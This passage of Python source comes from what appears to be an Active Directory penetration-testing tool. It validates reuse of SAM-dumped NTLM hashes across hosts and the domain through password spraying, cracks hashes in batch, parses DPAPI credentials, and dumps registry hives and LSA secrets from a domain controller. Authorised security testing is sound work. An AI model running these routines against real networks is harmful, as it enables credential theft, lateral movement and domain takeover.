            f"Skipped local credential reuse validation for {marked_domain}: no candidate selected."
        )
        return

    if not confirm_operation(
        operation_name="Local Credential Reuse Validation",
        description=(
            "Runs local-auth reuse validation on selected credentials and "
            "records LocalAdminPassReuse steps only for confirmed admin hits."
        ),
        context={
            "Domain": marked_domain,
            "Source Host": marked_source_host,
            "Selected Candidates": str(len(selected_rows)),
            "Validation Method": "native local-auth (admin access required)",
        },
        default=True,
        icon="🔁",
        show_panel=True,
    ):
        print_info(
            f"Skipped local credential reuse validation for {marked_domain} by user choice."
        )
        return

    resolved_candidates = _resolve_reuse_candidate_credentials(
        shell=shell,
        candidates=selected_candidates,
    )
    resolved_rows = _build_resolved_reuse_candidate_rows(
        shell=shell,
        candidates=resolved_candidates,
    )
    if resolved_rows:
        print_info_table(
            resolved_rows,
            ["User", "RID", "Hosts", "Credential Type", "Credential", "Method"],
            title="Selected Local Reuse Candidates",
        )

    validation_results: list[dict[str, Any]] = []
    for item in sorted(
        resolved_candidates, key=lambda value: str(value.get("username") or "").lower()
    ):
        user_clean = str(item.get("username") or "").strip()
        cred_clean = str(item.get("credential") or "").strip()
        rid_clean = str(item.get("rid") or "").strip()
        if not user_clean or not cred_clean:
            continue
        marked_user = mark_sensitive(user_clean, "user")
        print_info(
            f"Validating local credential reuse for {marked_user} (RID {rid_clean}) across enabled hosts."
        )
        try:
            result = run_local_cred_reuse(
                shell,
                domain=domain,
                username=user_clean,
                credential=cred_clean,
                prompt_dump_after_reuse=False,
            )
            validation_results.append(
                {
                    "username": user_clean,
                    "rid": rid_clean or "-",
                    "source_hosts": int(item.get("source_hosts", 0) or 0),
                    "credential": cred_clean,
                    "credential_was_cracked": bool(item.get("credential_was_cracked")),
                    "result": result if isinstance(result, dict) else {},
                }
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning(
                f"Local admin reuse validation failed for {marked_user}; continuing."
            )
            validation_results.append(
                {
                    "username": user_clean,
                    "rid": rid_clean or "-",
                    "source_hosts": int(item.get("source_hosts", 0) or 0),
                    "credential": cred_clean,
                    "credential_was_cracked": bool(item.get("credential_was_cracked")),
                    "result": {
                        "status": "error",
                        "error": str(exc),
                        "reuse_targets": [],
                        "created_edges": 0,
                    },
                }
            )

    _print_local_reuse_validation_summary(
        domain=domain,
        results=validation_results,
        title="Single-Host Reuse Validation Summary",
    )
    _run_optional_domain_account_reuse_validation(
        shell=shell,
        domain=domain,
        candidates=resolved_candidates,
        source_scope="SAM dump (single host)",
        local_validation_results=validation_results,
    )


def _run_optional_domain_account_reuse_validation(
    shell: Any,
    *,
    domain: str,
    candidates: list[dict[str, Any]],
    source_scope: str,
    local_validation_results: list[dict[str, Any]] | None = None,
) -> None:
    """Optionally validate whether SAM credentials are also valid domain creds."""
    from adscan_internal.cli.spraying import (
        DomainReuseValidationCandidate,
        handle_validated_domain_hits_followup,
        select_domain_reuse_candidates_for_validation,
        validate_selected_domain_reuse_candidates,
    )

    grouped: dict[str, dict[str, Any]] = {}
    for item in candidates:
        if not isinstance(item, dict):
            continue
        username = str(item.get("username") or "").strip()
        credential = str(item.get("credential") or "").strip()
        rid = str(item.get("rid") or "-").strip() or "-"
        if not username or not credential:
            continue
        if credential.lower() == _EMPTY_NTLM_HASH:
            # Blank-password account: exclude the empty-string NTLM hash from
            # SAM -> Domain reuse so it is never offered or pre-selected for
            # domain spraying.
            continue
        key = credential.lower()
        bucket = grouped.setdefault(
            key,
            {
                "credential": credential,
                "accounts": [],
                "source_hostnames": set(),
                "credential_type": (
                    "Password (cracked)"
                    if bool(item.get("credential_was_cracked"))
                    else "Hash"
                    if _is_hash_credential(shell, credential)
                    else "Password"
                ),
            },
        )
        accounts = bucket.get("accounts")
        if isinstance(accounts, list):
            accounts.append(f"{username} (RID {rid})")
        source_hostnames = bucket.get("source_hostnames")
        if isinstance(source_hostnames, set):
            source_values = item.get("source_hostnames")
            if isinstance(source_values, list):
                for host_value in source_values:
                    host_clean = str(host_value).strip()
                    if host_clean:
                        source_hostnames.add(host_clean)

    if not grouped:
        return

    marked_domain = mark_sensitive(domain, "domain")
    total = len(grouped)
    hash_count = sum(
        1
        for value in grouped.values()
        if _is_hash_credential(shell, str(value["credential"]))
    )
    password_count = total - hash_count
    if not confirm_operation(
        operation_name="Domain Reuse Validation",
        description=(
            "Tests whether SAM-derived credentials are also valid for domain users "
            "using native password spraying where supported."
        ),
        context={
            "Domain": marked_domain,
            "Source Scope": source_scope,
            "Credential Variants": str(total),
            "Password Variants": str(password_count),
            "Hash Variants": str(hash_count),
        },
        default=True,
        icon="🎯",
        show_panel=True,
    ):
        print_info(
            f"Skipped SAM-to-domain reuse validation for {marked_domain} by user choice."
        )
        return

    rows: list[dict[str, Any]] = []
    for value in grouped.values():
        credential = str(value.get("credential") or "").strip()
        accounts = value.get("accounts")
        account_values = (
            sorted(str(account).strip() for account in accounts if str(account).strip())
            if isinstance(accounts, list)
            else []
        )
        rows.append(
            {
                "Accounts": ", ".join(
                    mark_sensitive(account, "user") for account in account_values[:3]
                )
                + (
                    f" (+{len(account_values) - 3} more)"
                    if len(account_values) > 3
                    else ""
                ),
                "Credential Type": str(value.get("credential_type") or "-"),
                "Credential": mark_sensitive(credential, "password"),
            }
        )
    if rows:
        print_info_table(
            rows,
            ["Accounts", "Credential Type", "Credential"],
            title="SAM -> Domain Reuse Candidates",
        )

    selection = select_domain_reuse_candidates_for_validation(
        shell,
        domain=domain,
        candidates=[
            DomainReuseValidationCandidate(
                credential=str(value.get("credential") or "").strip(),
                credential_type=str(value.get("credential_type") or "-"),
                accounts=sorted(
                    str(account).strip()
                    for account in value.get("accounts", [])
                    if str(account).strip()
                ),
                source_hostnames=sorted(
                    str(host).strip()
                    for host in value.get("source_hostnames", set())
                    if str(host).strip()
                ),
            )
            for value in grouped.values()
            if str(value.get("credential") or "").strip()
        ],
        source_scope=source_scope,
    )
    if selection is None:
        return
    selected_candidates, eligibility = selection

    print_info(
        "Running SAM-to-domain reuse validation for "
        f"{len(selected_candidates)} selected credential variant(s) in {marked_domain}."
    )
    (
        result_rows,
        domain_results_by_credential,
        validated_domain_hits,
    ) = validate_selected_domain_reuse_candidates(
        shell,
        domain=domain,
        candidates=selected_candidates,
        eligibility=eligibility,
    )

    if result_rows:
        print_info_table(
            result_rows,
            [
                "Accounts",
                "Credential Type",
                "Credential",
                "Status",
                "Domain Hits",
                "Local->Domain Steps",
                "DomainPassReuse",
                "Outcome Summary",
            ],
            title="SAM -> Domain Reuse Validation Results",
        )
    _print_sam_reuse_combined_summary(
        shell=shell,
        domain=domain,
        grouped_candidates=grouped,
        domain_results_by_credential=domain_results_by_credential,
        local_validation_results=local_validation_results or [],
    )
    auth_state = str(shell.domains_data.get(domain, {}).get("auth", "")).strip().lower()
    if validated_domain_hits and auth_state != "pwned":
        handle_validated_domain_hits_followup(
            shell,
            domain=domain,
            hits=validated_domain_hits,
            discovery_label="validated",
        )


def _summarize_outcomes_for_table(
    outcomes: dict[str, int],
    *,
    limit: int = 3,
    excluded_codes: set[str] | None = None,
) -> str:
    """Render compact top-N outcome summary for UX tables."""
    if not outcomes:
        return "-"
    excluded = {str(code).upper() for code in (excluded_codes or set())}
    normalized: dict[str, int] = {}
    for raw_code, raw_count in outcomes.items():
        code = str(raw_code or "").strip().upper()
        if not code or code in excluded:
            continue
        normalized[code] = int(normalized.get(code, 0)) + int(raw_count or 0)
    if not normalized:
        return "-"
    ordered = sorted(normalized.items(), key=lambda item: (-item[1], item[0]))
    summary = ", ".join(f"{code}={count}" for code, count in ordered[:limit])
    if len(ordered) > limit:
        summary += f", +{len(ordered) - limit} more"
    return summary


def _build_local_results_by_credential(
    local_validation_results: list[dict[str, Any]],
) -> dict[str, dict[str, Any]]:
    """Aggregate local reuse validation result by credential value."""
    grouped: dict[str, dict[str, Any]] = {}
    for item in local_validation_results:
        if not isinstance(item, dict):
            continue
        credential = str(item.get("credential") or "").strip()
        if not credential:
            continue
        key = credential.lower()
        bucket = grouped.setdefault(
            key,
            {
                "status": "not_reused",
                "local_hits": 0,
                "outcomes": {},
            },
        )
        result_data = item.get("result")
        if not isinstance(result_data, dict):
            continue
        raw_status = str(result_data.get("status") or "").strip().lower()
        if raw_status not in {"reused", "no_reuse", "error"}:
            raw_status = "reused" if result_data.get("reuse_targets") else "no_reuse"
        if raw_status == "error":
            bucket["status"] = "error"
        elif raw_status == "reused" and str(bucket.get("status")) != "error":
            bucket["status"] = "reused"
        elif (
            str(bucket.get("status")) not in {"error", "reused"}
            and raw_status == "no_reuse"
        ):
            bucket["status"] = "not_reused"

        targets_raw = result_data.get("reuse_targets")
        targets = targets_raw if isinstance(targets_raw, list) else []
        bucket["local_hits"] = max(int(bucket.get("local_hits", 0)), len(targets))

        outcomes_raw = result_data.get("outcome_counts")
        outcomes = outcomes_raw if isinstance(outcomes_raw, dict) else {}
        merged_outcomes = bucket.get("outcomes")
        if not isinstance(merged_outcomes, dict):
            merged_outcomes = {}
            bucket["outcomes"] = merged_outcomes
        for code, count in outcomes.items():
            normalized_code = str(code).strip().upper()
            if not normalized_code:
                continue
            merged_outcomes[normalized_code] = int(
                merged_outcomes.get(normalized_code, 0)
            ) + int(count)

    return grouped


def _print_sam_reuse_combined_summary(
    *,
    shell: Any,
    domain: str,
    grouped_candidates: dict[str, dict[str, Any]],
    domain_results_by_credential: dict[str, dict[str, Any]],
    local_validation_results: list[dict[str, Any]],
) -> None:
    """Render one combined local+domain reuse summary per credential variant."""
    if not grouped_candidates:
        return
    local_results_by_credential = _build_local_results_by_credential(
        local_validation_results
    )
    rows_with_key: list[tuple[tuple[int, int, int, str], dict[str, Any]]] = []
    local_reused = 0
    domain_reused = 0
    both_reused = 0
    total_domain_steps = 0

    for key, candidate in sorted(grouped_candidates.items(), key=lambda item: item[0]):
        credential = str(candidate.get("credential") or "").strip()
        credential_type = str(candidate.get("credential_type") or "-")
        accounts_raw = candidate.get("accounts")
        accounts = (
            sorted(
                str(account).strip() for account in accounts_raw if str(account).strip()
            )
            if isinstance(accounts_raw, list)
            else []
        )
        accounts_label = ", ".join(
            mark_sensitive(account, "user") for account in accounts[:2]
        )
        if len(accounts) > 2:
            accounts_label += f" (+{len(accounts) - 2} more)"
        if not accounts_label:
            accounts_label = "-"

        local_info = local_results_by_credential.get(key, {})
        local_status_raw = str(local_info.get("status") or "not_reused")
        local_hits = int(local_info.get("local_hits", 0) or 0)
        if local_status_raw == "reused":
            local_status = "Reused"
            local_reused += 1
        elif local_status_raw == "error":
            local_status = "Error"
        else:
            local_status = "Not reused"

        local_outcomes_raw = local_info.get("outcomes")
        local_outcomes = (
            local_outcomes_raw if isinstance(local_outcomes_raw, dict) else {}
        )
        local_outcomes_label = _summarize_outcomes_for_table(
            local_outcomes,
            excluded_codes={"PWN3D"},
        )

        domain_info = domain_results_by_credential.get(key, {})
        domain_status_raw = str(domain_info.get("status") or "not_run").strip().lower()
        domain_hits_raw = domain_info.get("hits", 0)
        if isinstance(domain_hits_raw, list):
            domain_hits = len(
                [str(item).strip() for item in domain_hits_raw if str(item).strip()]
            )
        else:
            domain_hits = int(domain_hits_raw or 0)
        domain_graph_steps = int(domain_info.get("created_graph_steps", 0) or 0)
        total_domain_steps += domain_graph_steps
        if domain_status_raw == "success":
            domain_status = "Reused"
            domain_reused += 1
        elif domain_status_raw == "error":
            domain_status = "Error"
        elif domain_status_raw == "skipped":
            domain_status = "Skipped"
        elif domain_status_raw == "no_hits":
            domain_status = "Not reused"
        else:
            domain_status = "Not run"

        if local_status == "Reused" and domain_status == "Reused":
            both_reused += 1

        domain_outcomes_raw = domain_info.get("outcome_counts")
        if not isinstance(domain_outcomes_raw, dict):
            domain_outcomes_raw = domain_info.get("outcomes")
        domain_outcomes = (
            domain_outcomes_raw if isinstance(domain_outcomes_raw, dict) else {}
        )
        domain_outcomes_label = _summarize_outcomes_for_table(
            domain_outcomes,
            excluded_codes={"SUCCESS"},
        )

        impact_rank = 5
        if local_status == "Reused" and domain_status == "Reused":
            impact_rank = 0
        elif domain_status == "Reused":
            impact_rank = 1
        elif local_status == "Reused":
            impact_rank = 2
        elif local_status == "Error" or domain_status == "Error":
            impact_rank = 3
        elif domain_status == "Skipped":
            impact_rank = 4

        rows_with_key.append(
            (
                (impact_rank, -domain_hits, -local_hits, credential.lower()),
                {
                    "Accounts": accounts_label,
                    "Credential Type": credential_type,
                    "Credential": mark_sensitive(credential, "password"),
                    "Local Reuse": local_status,
                    "Local Hosts": local_hits,
                    "Domain Reuse": domain_status,
                    "Domain Hits": domain_hits,
                    "Domain Steps": domain_graph_steps,
                    "Local Outcomes": local_outcomes_label,
                    "Domain Outcomes": domain_outcomes_label,
                },
            )
        )

    if not rows_with_key:
        return
    rows = [row for _, row in sorted(rows_with_key, key=lambda item: item[0])]

    print_info_table(
        rows,
        [
            "Accounts",
            "Credential Type",
            "Credential",
            "Local Reuse",
            "Local Hosts",
            "Domain Reuse",
            "Domain Hits",
            "Domain Steps",
            "Local Outcomes",
            "Domain Outcomes",
        ],
        title="SAM Reuse Final Summary",
    )
    marked_domain = mark_sensitive(domain, "domain")
    print_panel(
        "\n".join(
            [
                "[bold]SAM Reuse Correlation Completed[/bold]",
                f"Domain: {marked_domain}",
                "",
                f"Credential variants analyzed: {len(rows)}",
                f"Local reuse confirmed: {local_reused}",
                f"Domain reuse confirmed: {domain_reused}",
                f"Confirmed in both scopes: {both_reused}",
                f"LocalCredToDomainReuse steps created: {total_domain_steps}",
            ]
        ),
        title="[bold magenta]SAM Reuse Correlation[/bold magenta]",
        border_style="magenta",
        expand=False,
    )


def _is_hash_credential(shell: Any, credential: str) -> bool:
    """Return True when credential value looks like an NTLM hash."""
    value = str(credential or "").strip()
    checker = getattr(shell, "is_hash", None)
    if callable(checker):
        try:
            return bool(checker(value))
        except Exception:  # noqa: BLE001
            return bool(re.fullmatch(r"[0-9a-fA-F]{32}", value))
    return bool(re.fullmatch(r"[0-9a-fA-F]{32}", value))


def _build_resolved_reuse_candidate_rows(
    *,
    shell: Any,
    candidates: list[dict[str, Any]],
) -> list[dict[str, Any]]:
    """Build candidate rows including resolved credential material."""
    rows_with_key: list[tuple[tuple[str, str, str], dict[str, Any]]] = []
    for item in candidates:
        if not isinstance(item, dict):
            continue
        username = str(item.get("username") or "").strip()
        rid = str(item.get("rid") or "-").strip() or "-"
        source_hosts = int(item.get("source_hosts", 0) or 0)
        credential = str(item.get("credential") or "").strip()
        if not username or not credential:
            continue
        is_hash = _is_hash_credential(shell, credential)
        was_cracked = bool(item.get("credential_was_cracked"))
        if is_hash:
            credential_type = "Hash"
        elif was_cracked:
            credential_type = "Password (cracked)"
        else:
            credential_type = "Password"

        row = {
            "User": mark_sensitive(username, "user"),
            "RID": rid,
            "Hosts": source_hosts,
            "Credential Type": credential_type,
            "Credential": mark_sensitive(credential, "password"),
            "Method": "Local-auth reuse validation",
        }
        rows_with_key.append(
            (
                (
                    username.lower(),
                    rid,
                    credential.lower(),
                ),
                row,
            )
        )

    return [row for _, row in sorted(rows_with_key, key=lambda item: item[0])]


def _resolve_reuse_candidate_credentials(
    *,
    shell: Any,
    candidates: list[dict[str, Any]],
) -> list[dict[str, Any]]:
    """Resolve candidate credentials before reuse validation (batch hash cracking)."""
    if not candidates:
        return []

    from adscan_internal.cli.creds import resolve_credential_pairs_for_batch

    resolved: list[dict[str, Any]] = []
    raw_pairs: list[tuple[str, str]] = []
    filtered_candidates: list[dict[str, Any]] = []
    for item in candidates:
        if not isinstance(item, dict):
            continue
        current = dict(item)
        username = str(current.get("username") or "").strip()
        credential = str(current.get("credential") or "").strip()
        if not username or not credential:
            continue
        if credential.lower() == _EMPTY_NTLM_HASH:
            # Blank-password account: the empty-string NTLM hash can only ever
            # match accounts that themselves have no password, so it is dropped
            # before reuse validation rather than wasting spray budget.
            print_info_debug(
                "[sam_reuse] Excluding blank-password candidate "
                f"{mark_sensitive(username, 'user')}: empty NTLM hash is "
                "not a usable credential."
            )
            continue
        filtered_candidates.append(current)
        raw_pairs.append((username, credential))

    resolved_pairs = resolve_credential_pairs_for_batch(
        shell,
        credentials=raw_pairs,
        skip_hash_cracking=False,
        skip_machine_accounts_cracking=True,
    )

    cracked_rows: list[dict[str, Any]] = []
    for current, (_resolved_user, resolved_credential) in zip(
        filtered_candidates, resolved_pairs
    ):
        original_credential = str(current.get("credential") or "").strip()
        was_cracked = original_credential != resolved_credential
        if was_cracked:
            username_clean = str(current.get("username") or "").strip()
            marked_user = mark_sensitive(username_clean, "user")
            print_info_debug(
                f"[sam_reuse] Using cracked password for reuse validation: {marked_user}"
            )
            cracked_rows.append(
                {
                    "User": marked_user,
                    "Original Hash": mark_sensitive(original_credential, "password"),
                    "Cracked Password": mark_sensitive(resolved_credential, "password"),
                }
            )
        current["original_credential"] = original_credential
        current["credential_was_cracked"] = was_cracked
        current["credential"] = resolved_credential
        resolved.append(current)

    if cracked_rows:
        print_info_table(
            cracked_rows,
            ["User", "Original Hash", "Cracked Password"],
            title="Cracked Local Reuse Credentials",
        )
    return resolved


def _summarize_reuse_targets_for_table(
    targets: list[dict[str, str]],
    *,
    max_hosts: int = 4,
) -> str:
    """Return compact host summary for reuse validation table rows."""
    host_values: list[str] = []
    seen: set[str] = set()
    for item in targets:
        if not isinstance(item, dict):
            continue
        host = str(item.get("hostname") or item.get("target") or "").strip()
        if not host:
            continue
        key = host.lower()
        if key in seen:
            continue
        seen.add(key)
        host_values.append(host)

    if not host_values:
        return "-"
    visible = host_values[:max_hosts]
    visible_marked = [mark_sensitive(value, "hostname") for value in visible]
    if len(host_values) > max_hosts:
        remaining = len(host_values) - max_hosts
        return f"{', '.join(visible_marked)} (+{remaining} more)"
    return ", ".join(visible_marked)


def _print_local_reuse_validation_summary(
    *,
    domain: str,
    results: list[dict[str, Any]],
    title: str,
) -> None:
    """Render final premium summary for local credential reuse validation batch."""
    if not results:
        return

    status_weight = {"reused": 0, "no_reuse": 1, "error": 2}
    rows_with_key: list[tuple[tuple[int, str], dict[str, Any]]] = []
    reused_count = 0
    no_reuse_count = 0
    error_count = 0
    total_edges = 0

    for item in results:
        if not isinstance(item, dict):
            continue
        username = str(item.get("username") or "").strip()
        rid = str(item.get("rid") or "-").strip() or "-"
        source_hosts = int(item.get("source_hosts", 0) or 0)
        result_data = item.get("result")
        if not isinstance(result_data, dict):
            result_data = {}
        credential_type_raw = (
            str(result_data.get("credential_type") or "").strip().lower()
        )
        if credential_type_raw == "hash":
            credential_type = "Hash"
        elif credential_type_raw == "password":
            credential_type = "Password"
        else:
            credential_type = "Unknown"
        raw_status = str(result_data.get("status") or "").strip().lower()
        if raw_status not in {"reused", "no_reuse", "error"}:
            raw_status = "reused" if result_data.get("reuse_targets") else "no_reuse"
        if raw_status == "reused":
            reused_count += 1
        elif raw_status == "error":
            error_count += 1
        else:
            no_reuse_count += 1

        targets = result_data.get("reuse_targets")
        targets_list = targets if isinstance(targets, list) else []
        host_count = len(targets_list)
        hosts_label = _summarize_reuse_targets_for_table(targets_list)
        created_edges = int(result_data.get("created_edges", 0) or 0)
        total_edges += created_edges

        if raw_status == "reused":
            status_label = "Reused"
        elif raw_status == "error":
            status_label = "Error"
        else:
            status_label = "Not reused"

        notes = "-"
        outcome_counts_raw = result_data.get("outcome_counts")
        outcome_counts = (
            outcome_counts_raw if isinstance(outcome_counts_raw, dict) else {}
        )
        filtered_outcomes = {
            str(code): int(count)
            for code, count in outcome_counts.items()
            if str(code).upper() != "PWN3D"
        }
        filtered_summary = ""
        if filtered_outcomes:
            ordered_outcomes = sorted(
                filtered_outcomes.items(),
                key=lambda item: (-int(item[1]), str(item[0])),
            )
            filtered_summary = ", ".join(
                f"{code}={count}" for code, count in ordered_outcomes[:3]
            )
            if len(ordered_outcomes) > 3:
                filtered_summary += f", +{len(ordered_outcomes) - 3} more"
        if raw_status == "error":
            error_text = str(result_data.get("error") or "").strip()
            notes = error_text[:90] if error_text else "Validation error"
        elif raw_status == "reused" and created_edges > 0:
            notes = f"{created_edges} LocalAdminPassReuse step(s)"
        if filtered_summary:
            if notes == "-":
                notes = f"Filtered: {filtered_summary}"
            else:
                notes = f"{notes} | Filtered: {filtered_summary}"

        rows_with_key.append(
            (
                (status_weight.get(raw_status, 9), username.lower()),
                {
                    "Credential": mark_sensitive(username or "-", "user"),
                    "Credential Type": credential_type,
                    "RID": rid,
                    "Source Hosts": source_hosts,
                    "Status": status_label,
                    "Reused Hosts": host_count,
                    "Targets": hosts_label,
                    "Notes": notes,
                },
            )
        )

    if not rows_with_key:
        return

    rows = [row for _, row in sorted(rows_with_key, key=lambda item: item[0])]
    print_info_table(
        rows,
        [
            "Credential",
            "Credential Type",
            "RID",
            "Source Hosts",
            "Status",
            "Reused Hosts",
            "Targets",
            "Notes",
        ],
        title=title,
    )

    marked_domain = mark_sensitive(domain, "domain")
    print_panel(
        "\n".join(
            [
                "[bold]Local Credential Reuse Validation Completed[/bold]",
                f"Domain: {marked_domain}",
                "",
                f"Credentials validated: {len(rows)}",
                f"Reused credentials: {reused_count}",
                f"Not reused: {no_reuse_count}",
                f"Errors: {error_count}",
                f"LocalAdminPassReuse steps created: {total_edges}",
            ]
        ),
        title="[bold magenta]Reuse Validation Result[/bold magenta]",
        border_style="magenta",
        expand=False,
    )


def _normalize_sam_rid(value: str | None) -> str:
    """Return a normalized RID string from SAM dump output."""
    return str(value or "").strip()


def _should_include_for_reuse_validation(
    *,
    username: str,
    rid: str,
    nt_hash: str,
) -> tuple[bool, str]:
    """Return inclusion decision and reason for local credential reuse validation."""
    username_clean = str(username or "").strip().lower()
    rid_clean = _normalize_sam_rid(rid)
    nt_hash_clean = str(nt_hash or "").strip().lower()
    if not username_clean:
        return False, "empty_username"
    if username_clean.endswith("$"):
        return False, "machine_account"
    # Well-known local accounts that are disabled/non-operational by default.
    if username_clean in _SAM_REUSE_EXCLUDED_USERNAMES:
        return False, "disabled_builtin_account"
    if rid_clean in _SAM_REUSE_EXCLUDED_RIDS:
        return False, "disabled_builtin_rid"
    if nt_hash_clean == _EMPTY_NTLM_HASH:
        return False, "empty_hash"
    if not re.fullmatch(r"[a-f0-9]{32}", nt_hash_clean):
        return False, "invalid_hash"
    return True, "eligible"


def _should_include_plaintext_sam_account(
    *,
    username: str,
) -> tuple[bool, str]:
    """Return inclusion decision for plaintext SAM account records."""
    username_clean = str(username or "").strip().lower()
    if not username_clean:
        return False, "empty_username"
    if username_clean.endswith("$"):
        return False, "machine_account"
    if username_clean in _SAM_REUSE_EXCLUDED_USERNAMES:
        return False, "disabled_builtin_account"
    return True, "eligible"


def _build_dump_source_steps(
    *,
    domain: str,
    dump_kind: str,
    host: str | None,
    auth_username: str | None = None,
    credential_username: str | None = None,
    secret: str | None = None,
    source_protocol: str | None = None,
) -> list[object]:
    """Build credential provenance steps for dump-derived credentials."""
    from adscan_internal.principal_utils import normalize_machine_account
    from adscan_internal.services.attack_graph_service import (
        CredentialSourceStep,
        resolve_entry_label_for_auth,
    )

    dump_key = str(dump_kind or "").strip().upper()
    # DumpSAM provenance is intentionally disabled for now because SAM output
    # can map local accounts to ambiguous domain identities.
    if dump_key == "SAM":
        return []
    relation = f"Dump{dump_key}"
    edge_type = f"dump_{dump_key.lower()}"

    notes = {
        "source": "credential_dump",
        "dump_type": dump_key,
    }
    entry_label: str
    host_clean = str(host or "").strip()
    if host_clean and host_clean.lower() != "all":
        machine_sam = normalize_machine_account(host_clean)
        if machine_sam:
            entry_label = machine_sam.upper()
            notes["entry_kind"] = "computer"
        else:
            entry_label = resolve_entry_label_for_auth(auth_username)
    else:
        entry_label = resolve_entry_label_for_auth(auth_username)
    if host_clean:
        notes["target_host"] = host_clean
    if auth_username:
        notes["auth_username"] = str(auth_username).strip()
    if credential_username:
        notes["credential_username"] = str(credential_username).strip()
    if str(secret or "").strip():
        notes["secret"] = str(secret).strip()
    if str(source_protocol or "").strip():
        notes["source_protocol"] = str(source_protocol).strip().lower()

    # Avoid self-loop provenance edges for machine accounts dumped from themselves
    # (e.g., BRAAVOS$ -> DumpLSA -> BRAAVOS$), which add noise without new context.
    if notes.get("entry_kind") == "computer" and credential_username:
        credential_machine = normalize_machine_account(str(credential_username))
        entry_machine = normalize_machine_account(str(entry_label))
        if credential_machine and credential_machine.lower() == entry_machine.lower():
            return []

    return [
        CredentialSourceStep(
            relation=relation,
            edge_type=edge_type,
            entry_label=entry_label,
            notes=notes,
        )
    ]


def process_dpapi_output(
    shell: Any,
    *,
    output: str,
    domain: str,
    host: str,
    auth_username: str | None = None,
    source_protocol: str = "smb",
    prompt_confirmation: bool = True,
) -> dict[str, Any]:
    """Process parsed DPAPI credentials and persist them with provenance."""
    bulk_mode = _is_bulk_dump_target(host)
    bulk_summary: dict[str, dict[str, Any]] = {}
    bulk_credentials: dict[tuple[str, str, bool], dict[str, Any]] = {}
    processed_creds: set[tuple[str, str, str]] = set()

    for entry in _extract_dpapi_credentials_with_hosts(output):
        username = str(entry.username or "").strip().replace("\x00", "")
        password = str(entry.password or "").strip().replace("\x00", "")
        if not username or not password or username.endswith("$"):
            continue

        step_host = _resolve_step_host(parsed_host=entry.host, requested_host=host)
        credential_domain = (
            str(entry.domain or domain).strip().rstrip(".").lower()
            or str(domain).strip().rstrip(".").lower()
        )
        dedupe_key = (credential_domain.lower(), username.lower(), password)
        if dedupe_key in processed_creds:
            if bulk_mode:
                _record_bulk_finding(
                    bulk_summary,
                    host=step_host,
                    username=username,
                    is_hash=False,
                )
                _record_bulk_credential(
                    bulk_credentials,
                    username=username,
                    credential=password,
                    is_hash=False,
                    host=step_host,
                )
            continue

        marked_username = mark_sensitive(username, "user")
        marked_password = mark_sensitive(password, "password")
        marked_host = mark_sensitive(step_host or "unknown host", "hostname")

        print_success(f"Credential found on {marked_host}:")
        print_warning(f"   User: {marked_username}")
        print_warning(f"   Password: {marked_password}")

        should_save = True
        if prompt_confirmation:
            should_save = Confirm.ask(
                f"Is this credential correct? User: {marked_username}, Password: {marked_password}",
                default=True,
            )

        if not should_save:
            print_warning("Credential discarded")
            continue

        if bulk_mode:
            _record_bulk_finding(
                bulk_summary,
                host=step_host,
                username=username,
                is_hash=False,
            )
            _record_bulk_credential(
                bulk_credentials,
                username=username,
                credential=password,
                is_hash=False,
                host=step_host,
            )
        else:
            shell.add_credential(
                credential_domain,
                username,
                password,
                source_steps=_build_dump_source_steps(
                    domain=credential_domain,
                    dump_kind="DPAPI",
                    host=step_host,
                    auth_username=auth_username,
                    credential_username=username,
                    secret=password,
                    source_protocol=source_protocol,
                ),
                credential_origin="dpapi",
            )
        print_success(f"Credential saved for {marked_username}")
        processed_creds.add(dedupe_key)

    if bulk_mode:
        _persist_bulk_credentials(
            shell,
            domain=domain,
            dump_kind="DPAPI",
            auth_username=auth_username,
            credentials=bulk_credentials,
        )
        _print_bulk_summary(dump_kind="DPAPI", summary=bulk_summary)

    return {"count": len(processed_creds), "bulk_mode": bulk_mode}


def run_dump_registries(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Dump SAM/SECURITY/SYSTEM registry hives from the PDC via native async RRP.

    Replaces the impacket reg.py subprocess + SMB share receiver approach.
    Uses NativeDumpService.backup_operator_dump() which opens the hives with
    REG_OPTION_BACKUP_RESTORE, downloads via ADMIN$, and parses in-process.
    No smbFolder, no impacket_scripts_dir dependency.
    """
    import tempfile
    from adscan_internal.services.async_bridge import run_async_sync
    from adscan_internal.services.exploitation.native_dump_service import (
        NativeDumpService,
    )
    from adscan_internal.services.exploitation.dump_display import (
        DumpDisplay,
        CredentialType,
    )
    from adscan_internal.services.smb_transport import SMBConfig

    pdc_ip: str = str(shell.domains_data.get(domain, {}).get("pdc") or "")
    pdc_hostname: str | None = shell.domains_data.get(domain, {}).get("pdc_hostname")

    if not pdc_ip:
        print_error("Registry dump requires a PDC IP. Run enumeration first.")
        return

    marked_domain = mark_sensitive(domain, "domain")
    marked_pdc = mark_sensitive(pdc_ip, "ip")

    display = DumpDisplay()
    display.operation_header(
        "Registry Dump (native RRP)", pdc_hostname or pdc_ip, phases=2
    )
    display.phase_start(1, 2, f"Saving SAM / SECURITY / SYSTEM from {marked_pdc}")

    is_hash = len(password) == 32 and all(
        c in "0123456789abcdef" for c in password.lower()
    )
    smb_config = SMBConfig(
        target_ip=pdc_ip,
        target_hostname=pdc_hostname,
        domain=domain,
        auth_domain=domain,
        username=username,
        password=None if is_hash else password,
        nt_hash=password if is_hash else None,
        kdc_ip=pdc_ip,
        use_kerberos=False,
    )

    with tempfile.TemporaryDirectory(prefix="adscan-regdump-") as tmp:
        result = run_async_sync(
            NativeDumpService().backup_operator_dump(smb_config, workspace_dir=tmp)
        )

    if not result.success:
        display.phase_error(f"Registry dump failed: {result.error or 'unknown'}")
        return

    display.phase_success(
        f"Hives downloaded  ·  SAM: {len(result.sam_hashes)} accounts"
        f"  | LSA: {len(result.lsa_secrets)} secrets"
    )

    display.phase_start(2, 2, "Streaming credentials")
    display.start_credential_stream(f"Registry  ·  {marked_domain}")

    _EMPTY = "31d6cfe0d16ae931b73c59d7e0c089c0"
    stored: list[tuple[str, str]] = []

    for sam in result.sam_hashes:
        if sam.nt_hash and sam.nt_hash != _EMPTY:
            display.stream_credential(CredentialType.SAM, sam.username, sam.nt_hash)
            stored.append((sam.username, sam.nt_hash))

    if result.machine_account_nt_hash:
        dc_acct = f"{(pdc_hostname or 'DC').upper()}$"
        display.stream_credential(
            CredentialType.LSA, dc_acct, result.machine_account_nt_hash, extras="[DC$]"
        )
        stored.append((dc_acct, result.machine_account_nt_hash))

    for secret in result.lsa_secrets:
        if secret.plaintext and secret.name not in ("$MACHINE.ACC",):
            display.stream_credential(
